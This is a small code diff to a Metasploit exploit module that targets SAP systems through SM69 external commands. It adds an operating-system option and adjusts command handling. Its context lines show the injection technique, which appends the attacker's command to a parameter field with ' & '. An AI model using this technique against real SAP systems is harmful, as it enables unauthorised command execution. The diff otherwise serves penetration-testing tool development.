@@ -75,7 +75,8 @@ class Metasploit4 < Msf::Exploit::Remote
         OptString.new('CLIENT', [true, 'Client', '001']),
         OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
         OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
-        OptString.new('COMMAND', [true, 'Command Name as in SM69', 'DBMCLI'])
+        OptString.new('COMMAND', [true, 'Command Name as in SM69', 'DBMCLI']),
+        OptString.new('OS', [true, 'Operating System 1. ANYOS, 2. UNIX, 3. Windows NT, 4. AS/400, 5. OS/400', '2'])
       ], self.class)
 
     register_advanced_options(
@@ -139,7 +140,7 @@ class Metasploit4 < Msf::Exploit::Remote
         fc[:COMMANDNAME] = "DBMCLI"
         fc[:ADDITIONAL_PARAMETERS] = cmd
       elsif target.name =~ /Windows/
-        fc[:COMMANDNAME] = datastore['COMMAND'] if datastore['COMMAND']
+        fc[:COMMANDNAME] = datastore['COMMAND']
         fc[:ADDITIONAL_PARAMETERS] = " & #{cmd.strip}"
       end
       fc.invoke
